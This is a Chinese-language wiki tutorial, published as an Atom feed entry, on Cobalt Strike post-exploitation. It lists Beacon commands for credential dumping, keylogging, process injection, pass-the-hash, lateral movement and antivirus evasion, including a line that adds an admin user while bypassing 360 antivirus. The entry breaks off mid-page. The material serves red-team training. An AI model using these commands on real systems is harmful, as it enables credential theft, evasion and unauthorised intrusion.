<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Tahir&#39;s Wiki</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-07-03T03:41:16.400Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Tahir</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>1-Cobalt Strike基础中篇</title>
    <link href="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/"/>
    <id>http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/</id>
    <published>2021-07-03T03:35:16.000Z</published>
    <updated>2021-07-03T03:41:16.400Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p><strong>by Tahir 2021.6.8</strong></p><p>接着基础上篇</p><h2 id="4-后渗透"><a href="#4-后渗透" class="headerlink" title="4.后渗透"></a>4.后渗透</h2><h3 id="4-1-会话管理"><a href="#4-1-会话管理" class="headerlink" title="4.1 会话管理"></a>4.1 会话管理</h3><h4 id="4-1-1-Beacon-的管理"><a href="#4-1-1-Beacon-的管理" class="headerlink" title="4.1.1 Beacon 的管理"></a>4.1.1 Beacon 的管理</h4><p>Beacon 控制台</p><p>在一个 Beacon 会话上右击 interact（交互）即可打开 Beacon 控制台，如果想对多个会话进行控制，也只需选中多个会话，执行相关功能即可。</p><p>在 Beacon 的控制台中的输入与输出之间，是一个状态栏，状态栏上的信息分别是：目标 NetBIOS 名称、用户名、会话PID以及 Beacon 最近一次连接到 CS 团队服务器的时间。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/1.png"></p><p>Beacon 控制台是在使用 CS 的过程中，很经常用到的功能，向 Beacon 发出的每个命令，都可以在这里看到，如果队友发送了消息，在 Beacon 控制台同样能看到，消息前还会显示队友的名称。</p><p><strong>Beacon 菜单</strong></p><ul><li><p>Access：包含了一些对凭据的操作及提权的选项</p></li><li><p>Explore：包含了信息探测与目标交互的选项</p></li><li><p>Pivoting：包含了一些设置代理隧道的选项</p></li><li><p>Session：包含了对当前 Beacon 会话管理的选项</p></li></ul><p><strong>Beacon 命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">help 帮助命令显示全部命令</span><br><span class="line">help xxx 显示某个命令的详细信息</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">argue 进程参数欺骗</span><br><span class="line">argue [command] [fake arguments]argue 命令 假参数 欺骗某个命令参数</span><br><span class="line">argue [command]argue 命令 取消欺骗某个命令参数</span><br><span class="line">利用这个也可以绕过360添加用户（非核晶模式非x86）比如:argue net1 /hello /hello /hello /hello /hellorun net1 user admin 123451 /add注：假参数需要比真命令长</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">blockdlls 阻止子进程加载非微软签名的dll</span><br><span class="line">blockdlls [start|stop]blockdlls start 启动此策略blockdlls stop 关闭此策略</span><br><span class="line">启动此策略后创建的子进程加载非微软签名的dll时会被阻止注：此特性是windows10自身特性，需要目标为windows10才能成功启用</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">browserpivot 浏览器代理前面介绍过</span><br><span class="line">browserpivot [pid] [x86|x64]</span><br><span class="line">browserpivot [stop]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cancel 取消正在进行的文件下载</span><br><span class="line">cancel filename</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd切换目录</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checkin 强制回连时发送主机信息</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">covertvpn 部署Covert VPN客户端，注：没啥用的功能不做介绍</span><br><span class="line">covertvpn [interface] [ip address]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clear 清空Beacon任务列队</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">connect 连接到一个TCP Beacon</span><br><span class="line">connect [target] [port]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp复制文件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dcsync从域控中提取密码哈希</span><br><span class="line">dcsync [DOMAIN.FQDN] 提取所有帐户的密码哈希</span><br><span class="line">dcsync [DOMAIN.FQDN] [DOMAIN\user] 特定用户的</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">desktop VNC远程桌面</span><br><span class="line">desktop pid [x86|x64] low|high 将vnc服务dll注入到指定进程中运行</span><br><span class="line">注：需要确保cs服务端有vnc dll</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dllinject 反射dll进程注入</span><br><span class="line">dllinject pid dllpath</span><br><span class="line">注：路径为本机路径</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dllload 使用LoadLibrary函数进行dll注入</span><br><span class="line">dllload pid dllpath </span><br><span class="line">注：LoadLibrary函数 dll注入，目标机上必须存在被注入的dll</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">download 下载目标机文件</span><br><span class="line">download filepath</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">downloads 列出正在下载的文件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drives 列出目标机上所有的磁盘盘符</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elevate 提权并生成一个高权限会话</span><br><span class="line">elevate [exploit] [listener]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execute 执行程序（无回显）</span><br><span class="line">execute [program] [arguments]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execute-assembly 内存加载执行.NET程序集</span><br><span class="line">execute-assembly .netpath [arguments]</span><br><span class="line">注：就是普通的内存加载执行.net程序</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit 结束Beacon进程</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getprivs 启用当前访问令牌所拥有的特权</span><br><span class="line">注：你可以通过shell whoami /all查看详细信息</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem 尝试模拟一个SYSTEM账号的令牌获取System权限</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid 获取当前令牌关联的用户ID</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashdump 转储密码哈希</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inject 在指定进程中派生会话</span><br><span class="line">inject [pid] &lt;x86|x64&gt; [listener]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inline-execute在Beacon会话中执行Beacon Object File (BOF)</span><br><span class="line">inline-execute [/path/to/file.o] [args]</span><br><span class="line">注：后面会详细讲解</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jobs 查看后渗透任务列表</span><br><span class="line">Beacon中有些功能会在其他进程中运行（例如键盘记录屏幕截图）</span><br><span class="line">这些任务在后台中运行，并在可用时报告其输出</span><br><span class="line">可以使用jobs查看Beacon中的所有任务</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jobkill 结束一个在后台运行</span><br><span class="line">jobkill [JID]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jump 在远程主机上执行payload生成一个会话</span><br><span class="line">jump [exploit] [target] [listener]</span><br><span class="line">此命令通过横向渗透在目标上执行payload生成会话(psexec winrm)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_purge 清除当前shell的Kerberos票据</span><br><span class="line">kerberos_ccache_use 从ccache文件中导入Kerberos票据kerberos_ccache_use [/path/to/file.ccache]</span><br><span class="line">kerberos_ticket_use 从ticket文件中导入Kerberos票据kerberos_ticket_use [/path/to/file.ticket]注：域渗透相关</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keylogger 将键盘记录器注入到一个进程运行</span><br><span class="line">keylogger [pid] [x86|x64] 注入到指定进程</span><br><span class="line">注：不带任何参数则临时生成一个进程注入</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kill 结束指定进程</span><br><span class="line">kill [pid]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">link 前面介绍过了是用来连接SMB Beacon的</span><br><span class="line">link ip pipe name</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logonpasswords 执行mimikatz获取密码</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls 显示目标机当前目录</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make_token 创建令牌前面有说过</span><br><span class="line">make_token username pass</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mimikatz 执行mimikatz命令</span><br><span class="line">mimikatz [module::command] &lt;args&gt;</span><br><span class="line">mimikatz [!module::command] &lt;args&gt;</span><br><span class="line">mimikatz [@module::command] &lt;args&gt;</span><br><span class="line">注：有些mimikatz命令需要system权限才能运行</span><br><span class="line">!代表强制将mimikatz提升到SYSTEM，然后再运行命令</span><br><span class="line">有些则需要使用Beacon当前访问令牌运行</span><br><span class="line">@代表强制mimikatz使用Beacon当前访问令牌运行命令</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir 在目标机上创建目录</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mode dns 使用DNS A作为数据通道(仅限DNS Beacon有效)</span><br><span class="line">mode dns6 使用DNS AAAA作为数据通道(仅限DNS Beacon有效)</span><br><span class="line">mode dns-txt 使用DNS TXT作为数据通道(仅限DNS Beacon有效)</span><br><span class="line">注：DNS Beacon默认使用DNS TXT作为数据通道</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv 移动目标机上的文件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net 在目标上执行net命</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">note 为当前Beacon会话备注</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">portscan 扫描端口</span><br><span class="line">portscan [targets] [ports] [arplicmp Inone] [max connections]</span><br><span class="line">注：前面有说过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powerpick 非托管powershell技术</span><br><span class="line">powerpick [commandlet] [arguments]</span><br><span class="line">注：非托管powershell技术就是不使用powershell.exe程序来执行powershell命令</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell 通过powershell.exe执行命令</span><br><span class="line">powershell-import导入Powershell脚本</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ppid 父进程欺骗</span><br><span class="line">ppid [pid] 将指定进程作为父进程</span><br><span class="line">ppid 直接执行ppid取消父进程欺骗</span><br><span class="line">注：父进程欺骗顾名思义就是伪造子进程的父进程为指定进程。</span><br><span class="line">这个听起来有点绕其实以前对抗过某杀软的应该都知道过父都是为了达到同一个目的</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps 显示进程列表</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psinject 在指定进程中执行PowerShell命令</span><br><span class="line">psinject [pid] [arch] [commandLet] [arguments]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pth hash传递攻击</span><br><span class="line">pth [DOMAIN\user] [NTLM hash]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd显示当前所在目录</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg 注册表查询命令(仅能查询)</span><br><span class="line">reg query [x86|x64] [root\path]</span><br><span class="line">reg queryv [x86|x64] [root\path] [subkey]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">remote-exec 在远程主机上执行命令</span><br><span class="line">remote-exec [method] [target] [command]</span><br><span class="line">和上面那个在远程主机上执行payload生成会话的没啥区别只不过变成了执行命令</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rev2self 恢复Beacon原始令牌</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm 删除文件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rportfwd 反向端口转发rportfwd [bind port] [forward host] [forward port] 开启端口转发rportfwd stop [bind port] 停止指定端口转发</span><br><span class="line">rportfwd 本机端口 目标ip 目标端口  注：将指定的本机端口转发到目标ip的目标端口</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run 在目标上执行程序（输出回显）</span><br><span class="line">run [program] [arguments]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">runas 以其他用户权限执行程序</span><br><span class="line">runas [DOMAIN\user] [password] [command] [arguments]</span><br><span class="line">注：相当于windows的runas命令</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">runasadmin 提权后执行命令</span><br><span class="line">runasadmin [exploit] [command] [args]</span><br><span class="line">注：与前面的elevate命令相似只不过变成了提权执行命令</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">runu 父进程欺骗</span><br><span class="line">runu [pid] [command] [arguments]</span><br><span class="line">注：与ppid差不多，runu使用指定进程作为父进程来执行命令</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screenshot 截屏</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setenv 设置环境变量</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell 通过cmd执行命令</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shinject shellcode注入</span><br><span class="line">shinject [pid] &lt;x86|x64&gt; shellcode_raw_path</span><br><span class="line">注：使用时注意目标进程架构</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep 设置beacon睡眠时间</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socks SOCKS4代理(不建议使用)</span><br><span class="line">socks [stop|port] 停止或在指定端口开启代理</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spawn 派生会话</span><br><span class="line">spawn [x86|x64] [listener]</span><br><span class="line">注：默认情况下，spawn命令会在rundll32.exe中派生会话可以使用spawnto改变此默认</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spawnas 以其他用户身份派生会话</span><br><span class="line">spawnas [DOMAIN\user] [password] [listener]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">spawnto 设置Beacon派生会话时使用的程序</span><br><span class="line">spawnto [x86|x64] [程序路径]</span><br><span class="line">注：此命令用来更改Beacon默认派生会话时使用的程序，比如</span><br><span class="line">spawnto x64 C:\Windows\System32\notepad.exe</span><br><span class="line">在派生一个新的x64会话时就会启动一个notepad进程来作为傀儡</span><br><span class="line">直接输入spawnto回车代表清除设置使用默认配置</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spawnu 在指定进程中派生会话</span><br><span class="line">spawnu [pid] [listener]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh 使用ssh密码远程连接</span><br><span class="line">ssh [target:port] [user] [pass]</span><br><span class="line">注：通过Beacon内置的ssh客户端实现</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-key 使用SSH密钥远程连接</span><br><span class="line">ssh [target:port] [user] [/path/to/key.pem]</span><br><span class="line">注：和上一个没啥区别</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steal_token 从进程中窃取访问令牌</span><br><span class="line">steal_token [pid]</span><br><span class="line">注：可以使用getuid命令会打印你的当前令牌,rev2self恢复的原始令牌。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timestomp 复制指定文件时间戳到其他文件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlink 断开与子Beacon的连接</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload 上传文件</span><br></pre></td></tr></table></figure><p><strong>Script Console</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">? 执行sleep判断语句并输出结果</span><br><span class="line">e 执行sleep说明语句</span><br><span class="line">help 帮助</span><br><span class="line">load 加载一个脚本</span><br><span class="line">ls 列出加载的所有脚本</span><br><span class="line">proff 关闭脚本分析器</span><br><span class="line">pron 为开启脚本分析器</span><br><span class="line">profile 脚本性能统计</span><br><span class="line">reload 重新加载脚本</span><br><span class="line">troff 关闭脚本跟踪功能</span><br><span class="line">tron 开启脚本跟踪功能</span><br><span class="line">unload 卸载脚本</span><br><span class="line">x 执行sleep表达式并输出结果</span><br></pre></td></tr></table></figure><h4 id="4-1-2-派生会话-会话传递"><a href="#4-1-2-派生会话-会话传递" class="headerlink" title="4.1.2 派生会话/会话传递"></a>4.1.2 派生会话/会话传递</h4><p><strong>会话传递相关命令</strong></p><p>Beacon 被设计的最初目的就是向其他的 CS 监听器传递会话。</p><ul><li><p>spawn：进行会话的传递，也可直接右击会话选择spawn命令进行会话的选择。默认情况下，spawn命令会在 rundll32.exe 中派生一个会话。为了更好的隐蔽性，可以找到更合适的程序（如 Internet Explorer） 并使用spawnto命令来说明在派生新会话时候会使用 Beacon 中的哪个程序。</p></li><li><p>spawnto：该命令会要求指明架构（x86 还是 x64）和用于派生会话的程序的完整路径。单独输入spawnto命令然后按 enter 会指示 Beacon 恢复至其默认行为。</p></li><li><p>inject：输入inject + 进程 id + 监听器名来把一个会话注入一个特定的进程中。使用 ps 命令来获取一个当前系统上的进程列表。使用inject [pid] x64来将一个64位 Beacon 注入到一个 64位进程中。</p></li><li><p>spawn和inject命令都将一个 payload stage 注入进内存中。如果 payload stage 是 HTTP、HTTPS 或 DNS Beacon 并且它无法连接到你，那么将看不到一个会话。如果 payload stage 是一个绑定的 TCP 或 SMB 的 Beacon，这些命令会自动地尝试连接到并控制这些 payload。</p></li><li><p>dllinject：dllinject + [pid]来将一个反射性 DLL 注入到一个进程中。</p></li><li><p>shinject：使用shinject [pid] [架构] [/路径/…/file.bin]命令来从一个本地文件中注入 shellcode 到一个目标上的进程中。</p></li><li><p>shspawn：使用shspawn [架构] [/路径/…/file.bin]命令会先派生一个新进程（这个新进程是 spawn to 命令指定的可执行文件），然后把指定的 shellcode 文件（ file.bin ）注入到这个进程中。</p></li><li><p>dllload：使用dllload [pid] [c:\路径...\file.dll]来在另一个进程中加载磁盘上的 DLL文件。</p></li></ul><h5 id="4-1-2-1-CS自身增加会话"><a href="#4-1-2-1-CS自身增加会话" class="headerlink" title="4.1.2.1 CS自身增加会话"></a>4.1.2.1 CS自身增加会话</h5><p>1.首先创建一个新的监听器，用于自身派生会话。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/2.png"></p><p>2.然后在要派生的会话上右键点击Spawn即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/3.png"></p><p>3.选择要派生到刚刚新建的监听器上，点击choose即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/5.png"></p><p>4.可以看到会话成功派生。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/4.png"></p><h5 id="4-1-2-2-在其他teamserver上做备份会话"><a href="#4-1-2-2-在其他teamserver上做备份会话" class="headerlink" title="4.1.2.2 在其他teamserver上做备份会话"></a>4.1.2.2 在其他teamserver上做备份会话</h5><p>1.在另一台Linux服务器上开启teamserver。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/6.png"></p><p>2.通过客户端连接上新开启的teamserver。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/7.png"></p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/8.png"></p><p><img 